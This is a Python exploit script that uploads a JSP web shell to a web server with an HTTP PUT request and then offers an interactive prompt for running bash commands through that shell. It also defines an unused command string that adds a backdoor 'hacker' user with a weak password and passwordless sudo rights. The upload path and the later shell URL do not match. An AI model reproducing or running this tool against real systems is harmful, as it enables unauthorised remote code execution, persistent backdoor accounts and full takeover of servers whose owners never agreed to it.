#!/usr/bin/env python3
import requests
import urllib.parse


shell_name = f"shell.jsp"

JSP_PAYLOAD = """<%@page import="java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = in.readLine()) != null) {
        out.println(line);
    }
}
%>"""

add_user = """sudo useradd -m -s /bin/bash -G sudo hacker && echo "hacker:12345" | sudo chpasswd && echo "hacker ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers"""
remove_user = """sudo deluser --remove-home hacker"""


Banner = """
                                                                                                                                                                                                                                                                                                                                                                                                  
"""





def upload_shell(target):
    shell_url = f"{target.rstrip('/')}/upload/{shell_name}"

    try:
        response = requests.put(
            shell_url,
            headers={"Content-Type": "text/plain"},
            data=JSP_PAYLOAD,
            timeout=10
        )

        if response.status_code in [200, 201, 204]:
            print(f"[+] Shell uploaded to: {shell_url}")
            return True
        print(f"[-] Upload failed (HTTP {response.status_code})")
    except Exception as e:
        print(f"[-] Upload error: {e}")
    return None


def execute_command(shell_url, command):
    try:
        response = requests.get(
            f"{shell_url}?cmd={urllib.parse.quote(command)}",
            timeout=8
        )
        if response.status_code == 200:
            return response.text
    except Exception as e:
        print(f"[-] Execution error: {e}")
    return None


def main():
    target = "http://127.0.0.1:8080/Rito"

    # Upload shell
    if not upload_shell(target):
        return

    shell_url = target + "/" + shell_name

    # Test command execution
    print("\nEnter commands to execute (or 'exit' to quit):")
    while True:
        cmd = input("$ ")
        if cmd.lower() in ['exit', 'quit']:
            break
        if not cmd.strip():
            continue

        result = execute_command(shell_url, cmd)
        print(result if result else "[No output]")


if __name__ == "__main__":
    main()
